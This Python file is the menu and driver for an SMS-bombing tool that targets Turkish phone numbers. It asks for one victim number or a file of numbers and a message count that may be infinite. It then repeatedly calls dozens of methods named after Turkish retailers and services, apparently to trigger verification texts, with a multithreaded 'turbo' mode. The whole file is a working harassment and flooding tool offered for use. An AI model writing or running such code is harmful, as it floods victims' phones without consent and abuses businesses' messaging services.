import time
import os
from colorama import Fore, Style
from time import sleep
from os import system
from sms import SendSms
from concurrent.futures import ThreadPoolExecutor, wait

def slow_print(text, delay=0.001, end='\n'):
    for char in text:
        print(char, end='', flush=True)
        sleep(delay)
    print(end, flush=True)

def slow_print_more(text, delay=0.03, end='\n'):
    for char in text:
        print(char, end='', flush=True)
        sleep(delay)
    print(end, flush=True)

def slow_print_more_more(text, delay=0.06, end='\n'):
    for char in text:
        print(char, end='', flush=True)
        sleep(delay)
    print(end, flush=True)

servisler_sms = []
for attribute in dir(SendSms):
    attribute_value = getattr(SendSms, attribute)
    if callable(attribute_value):
        if attribute.startswith('__') == False:
            servisler_sms.append(attribute)

def check_skip_input():
    if os.name == 'nt':
        import msvcrt
        if msvcrt.kbhit():
            key = msvcrt.getch()
            if key == b'\x05':  # Ctrl + E
                return 'skip_animation'
            elif key == b'\x12':  # Ctrl + R
                return 'skip_legal'
            elif key == b'\x0f':  # Ctrl + O
                return 'skip_warning'
    return None






while 1:
    system("cls||clear")
    print(f"""{Fore.LIGHTCYAN_EX}
                  ______   __       __   ______   ________  __    __  ________  ______   __    __  ______ 
                 /      \\ /  \\     /  | /      \\ /        |/  |  /  |/        |/      \\ /  \\  /  |/      |
                /$$$$$$  |$$  \\   /$$ |/$$$$$$  |$$$$$$$$/ $$ |  $$ |$$$$$$$$//$$$$$$  |$$  \\ $$ |$$$$$$/ 
                $$ \\__$$/ $$$  \\ /$$$ |$$ \\__$$/    $$ |   $$ |  $$ |$$ |__   $$ |__$$ |$$$  \\$$ |  $$ |  
                $$      \\ $$$$  /$$$$ |$$      \\    $$ |   $$ |  $$ |$$    |  $$    $$ |$$$$  $$ |  $$ |  
                 $$$$$$  |$$ $$ $$/$$ | $$$$$$  |   $$ |   $$ |  $$ |$$$$$/   $$$$$$$$ |$$ $$ $$ |  $$ |  
                /  \\__$$ |$$ |$$$/ $$ |/  \\__$$ |   $$ |   $$ \\__$$ |$$ |     $$ |  $$ |$$ |$$$$ | _$$ |_ 
                $$    $$/ $$ | $/  $$ |$$    $$/    $$ |   $$    $$/ $$ |     $$ |  $$ |$$ | $$$ |/ $$   |
                 $$$$$$/  $$/      $$/  $$$$$$/     $$/     $$$$$$/  $$/      $$/   $$/ $$/   $$/ $$$$$$/ 
\n
                                   {Style.RESET_ALL}{Fore.LIGHTYELLOW_EX}Tiktok: tiktok.com/@unknown_napim
                                   {Style.RESET_ALL}{Fore.LIGHTYELLOW_EX}Youtube: youtube.com/@unknown_destroyer
                                   {Style.RESET_ALL}{Fore.LIGHTYELLOW_EX}Youtube 2: youtube.com/@samhordesongs
                                   {Style.RESET_ALL}{Fore.LIGHTYELLOW_EX}Discord: anonymous_destroyer01
                                   {Style.RESET_ALL}{Fore.LIGHTYELLOW_EX}Github: github.com/Unknowndestroy
   """)





    try:
        menu = input(Fore.LIGHTRED_EX + "1- Start SMS Attack (Normal, Slow [MULTI-Number-Attack Supported])\n\n2- Start SMS Attack (Turbo, Very Fast [Multi Number Attack Not Supported])\n\n3- Exit\n\n" + Fore.LIGHTYELLOW_EX + " Selection: ")
        if menu == "":
            continue
        menu = int(menu)
    except ValueError:
        system("cls||clear")
        print(Fore.LIGHTRED_EX + "Invalid input, please try again.")
        sleep(3)
        continue

    if menu == 3:
        system("cls||clear")
        print(Fore.LIGHTYELLOW_EX + "Exiting...\n")
        break

    if menu == 1:
        system("cls||clear")
        print(Fore.LIGHTRED_EX + "\nAre you sure to continue?\n")
        print(Fore.LIGHTYELLOW_EX + "Yes (y) / No (n): ", end="")
        confirmation = input().lower()

        if confirmation != 'y':
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Operation cancelled. Sending you to main menu...")
            sleep(3)
            continue

        print(Fore.LIGHTYELLOW_EX + "Write the phone number without the '+90' on start. (If more than one, Type 'MULTI'.): ", end="")
        tel_no = input()
        tel_liste = []

        if tel_no == "Multi":
            system("cls||clear")
            print(Fore.LIGHTYELLOW_EX + "Input the path of the TXT file that contains phone numbers: ", end="")
            dizin = input()
            try:
                with open(dizin, "r", encoding="utf-8") as f:
                    for i in f.read().strip().split("\n"):
                        if len(i) == 10:
                            tel_liste.append(i)
                sonsuz = ""
            except FileNotFoundError:
                system("cls||clear")
                print(Fore.LIGHTRED_EX + "Invalid path. Please try again. If you created the file when SMSTufanı is open, restart the SMSTufanı.")
                sleep(3)
                continue
        else:
            try:
                int(tel_no)
                if len(tel_no) != 10:
                    raise ValueError
                tel_liste.append(tel_no)
                sonsuz = "(If infinite, press 'Enter')"  
            except ValueError:
                system("cls||clear")
                print(Fore.LIGHTRED_EX + "Invalid phone number. Please try again.") 
                sleep(3)
                continue

        system("cls||clear")
        try:
            print(Fore.LIGHTYELLOW_EX + "Mail adress (If you dont know, press 'Enter'.): ", end="")
            mail = input()
            if ("@" not in mail or ".com" not in mail) and mail != "":
                raise
        except:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Invalid mail adress. Please try again.") 
            sleep(3)
            continue

        system("cls||clear")
        try:
            print(Fore.LIGHTYELLOW_EX + f"How much sms do you want to send? {sonsuz}: ", end="")
            kere = input()
            if kere:
                kere = int(kere)
            else:
                kere = None
        except ValueError:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Invalid input. Please try again.") 
            sleep(3)
            continue

        system("cls||clear")
        try:
            print(Fore.LIGHTYELLOW_EX + "How much delay you want between of the per sms: ", end="")
            aralik = int(input())
        except ValueError:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Invalid input. Please try again.") 
            sleep(3)
            continue

        system("cls||clear")
        if kere is None: 
            sms = SendSms(tel_no, mail)
            while True:
                for attribute in dir(SendSms):
                    attribute_value = getattr(SendSms, attribute)
                    if callable(attribute_value):
                        if attribute.startswith('__') == False:
                            exec("sms." + attribute + "()")
                            sleep(aralik)
        for i in tel_liste:
            sms = SendSms(i, mail)
            if isinstance(kere, int):
                while sms.adet < kere:
                    for attribute in dir(SendSms):
                        attribute_value = getattr(SendSms, attribute)
                        if callable(attribute_value):
                            if attribute.startswith('__') == False:
                                if sms.adet == kere:
                                    break
                                exec("sms." + attribute + "()")
                                sleep(aralik)
        print(Fore.LIGHTGREEN_EX + "\nSuccessfull. Press 'Enter' to go back to menu")
        input()
    elif menu == 3:
        system("cls||clear")
        slow_print(Fore.LIGHTRED_EX + "Exiting...")
        break
    elif menu == 2:
        system("cls||clear")
        print(Fore.LIGHTYELLOW_EX + "Input the phone number wıthout '+90' at start: ", end="")
        tel_no = input()
        try:
            int(tel_no)
            if len(tel_no) != 10:
                raise ValueError
        except ValueError:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Invalid phone number, please try again.") 
            sleep(3)
            continue
        system("cls||clear")
        try:
            print(Fore.LIGHTYELLOW_EX + "Mail adress (If you dont know, press 'Enter'): ", end="")
            mail = input()
            if ("@" not in mail or ".com" not in mail) and mail != "":
                raise
        except:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Invalid mail adress. Please try again.") 
            sleep(3)
            continue
        system("cls||clear")
        send_sms = SendSms(tel_no, mail)
        try:
            while True:
                with ThreadPoolExecutor() as executor:
                    futures = [
                        executor.submit(send_sms.Akasya),
                        executor.submit(send_sms.Akbati),
                        executor.submit(send_sms.Ayyildiz),
                        executor.submit(send_sms.Baydoner),
                        executor.submit(send_sms.Beefull),
                        executor.submit(send_sms.Bim),
                        executor.submit(send_sms.Bisu),
                        executor.submit(send_sms.Bodrum),
                        executor.submit(send_sms.Clickme),
                        executor.submit(send_sms.Dominos),
                        executor.submit(send_sms.Englishhome),
                        executor.submit(send_sms.Evidea),
                        executor.submit(send_sms.File),
                        executor.submit(send_sms.Frink),
                        executor.submit(send_sms.Happy),
                        executor.submit(send_sms.Hayatsu),
                        executor.submit(send_sms.Hey),
                        executor.submit(send_sms.Hizliecza),
                        executor.submit(send_sms.Icq),
                        executor.submit(send_sms.Ipragaz),
                        executor.submit(send_sms.Istegelsin),
                        executor.submit(send_sms.Joker),
                        executor.submit(send_sms.KahveDunyasi),
                        executor.submit(send_sms.KimGb),
                        executor.submit(send_sms.Komagene),
                        executor.submit(send_sms.Koton),
                        executor.submit(send_sms.KuryemGelsin),
                        executor.submit(send_sms.Macro),
                        executor.submit(send_sms.Metro),
                        executor.submit(send_sms.Migros),
                        executor.submit(send_sms.Naosstars),
                        executor.submit(send_sms.Paybol),
                        executor.submit(send_sms.Pidem),
                        executor.submit(send_sms.Porty),
                        executor.submit(send_sms.Qumpara),
                        executor.submit(send_sms.Starbucks),
                        executor.submit(send_sms.Suiste),
                        executor.submit(send_sms.Taksim),
                        executor.submit(send_sms.Tasdelen),
                        executor.submit(send_sms.Tasimacim),
                        executor.submit(send_sms.Tazi),
                        executor.submit(send_sms.TiklaGelsin),
                        executor.submit(send_sms.ToptanTeslim),
                        executor.submit(send_sms.Ucdortbes),
                        executor.submit(send_sms.Uysal),
                        executor.submit(send_sms.Wmf),
                        executor.submit(send_sms.Yapp),
                        executor.submit(send_sms.YilmazTicaret),
                        executor.submit(send_sms.Yuffi),
                    ]
                    wait(futures)
                sleep(5)  
        except KeyboardInterrupt:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "SMS Attack stopped..") 
            sleep(3)
            continue

        print(Fore.LIGHTGREEN_EX + "\nSuccesfull. Press 'Enter' to go back to menu.")
        input()

